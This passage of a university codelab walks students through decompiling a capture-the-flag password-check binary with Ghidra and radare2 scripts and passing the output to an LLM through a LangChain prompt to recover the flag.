+<p>Then, a utility program (<code>src/ghidra_example/jython_getMain.py</code>) invokes Ghidra&#39;s decompiler to produce a function-level decompilation into C code. The program first creates a decompiler interface and then initializes the decompiler with the program argument. The monitor is used to monitor the progress made during the analysis.</p>
+<pre><code>decompiler = DecompInterface()
+decompiler.openProgram(program)
+monitor = ConsoleTaskMonitor()</code></pre>
+<p>The function manager manages all of the functions that are detected in the binary. The <code>getFunctions(True)</code> line will return an iterator over all of the functions detected in the binary.</p>
+<pre><code>function_manager = program.getFunctionManager()
+functions = function_manager.getFunctions(True)  # True to iterate forward</code></pre>
+<p>Then the program iterates over the returned functions, looking for functions that start with &#34;<code>main</code>&#34;. When functions that start with &#34;<code>main</code>&#34; are found it will try to decompile the function and if that succeeds it will print the C code of the function</p>
+<pre><code>results = decompiler.decompileFunction(function, 0, monitor)
+if results.decompileCompleted():
+    print(&#34;Decompiled_Main: \n{}&#34;.format(results.getDecompiledFunction().getC()))
+else:
+    print(&#34;Failed to decompile {}&#34;.format(function.getName()))</code></pre>
+<p>The output of this step can then be fed back to our original program for analysis.</p>
+<p>Run the program:</p>
+<pre>uv run 04_ghidra.py</pre>
+<p>Find the decompiled C code that checks for the password</p>
+<ul>
+<li><strong>Take a screenshot of the code that includes your FAU email ID</strong></li>
+</ul>
+<p>Take the flag generated by the program, then run the binary file and enter the flag:</p>
+<pre>./src/ghidra_example/asciiStrCmp</pre>
+<ul>
+<li><strong>Take a screenshot of the results that includes your FAU email ID</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Binary analysis with radare2" duration="3">
+<p>Similar to Ghidra, the <code>radare2</code> suite of reverse engineering tools can also be used to augment the reverse engineering process in order to aid the LLM in its analysis. To begin with, setup the tools to build the <code>radare2</code> decompiler, then use the <code>radare2</code> package manager <code>r2pm</code> to install the decompiler package.</p>
+<pre><code>sudo apt update -y
+sudo apt install -y meson ninja-build
+
+r2pm -U
+r2pm -ci r2dec</code></pre>
+<p>Consider the code below that utilizes <code>r2</code>&#39;s scripting support <code>r2pipe</code> to open up an executable in <code>r2</code> and execute a simple decompilation process on it. Upon returning the result of decompilation, the tool then sends the results to the LLM to analyze.</p>
+<pre><code>prompt1 = PromptTemplate.from_template(&#34;&#34;&#34;You are an expert reverse engineer, tasked with finding the flag by analyzing the code that is provided.
+
+    Here is the code:
+    {code}
+
+    Find the flag!
+    &#34;&#34;&#34;)
+
+# Open the binary using r2pipe
+r2 = r2pipe.open(program)
+
+# Perform initial analysis with radare2
+# Do not show output of these two commands
+_ = r2.cmd(&#34;aaa&#34;)  # Analyze all functions and references
+_ = r2.cmd(&#34;s main&#34;)  # Seek to the main function, if exists
+
+# Attempt to decompile the main function
+output = r2.cmd(&#34;pdd&#34;)
+
+# Send output to chain
+chain = (
+      {&#39;code&#39;:RunnablePassthrough()}
+      | prompt1
+      | llm
+      | StrOutputParser()
+)
+
+llm_result = chain.invoke(output)</code></pre>
+<p>Run the program:</p>
+<pre>uv run 05_radare2.py</pre>
+<p>Find the decompiled code generated by the decompiler</p>
+<ul>
+<li><strong>Take a screenshot of the password checking code that includes your FAU email ID</strong></li>
+</ul>
+<p>Take the flag generated by the program, then run the binary file and enter the flag:</p>
+<pre>./src/ghidra_example/asciiStrCmp</pre>
+<ul>
+<li><strong>Take a screenshot of the results that includes your FAU email ID</strong></li>
+</ul>
+</google-codelab-step>
+</google-codelab>
+<script src="/gensec-web/scripts/native-shim.js"></script>
+<script src="/gensec-web/scripts/custom-elements.min.js"></script>
+<script src="/gensec-web/scripts/prettify.js"></script>
+<script src="/gensec-web/scripts/codelab-elements.js"></script>
+<script src="https://support.google.com/inapp/api.js"></script>
+</body>
+</html>
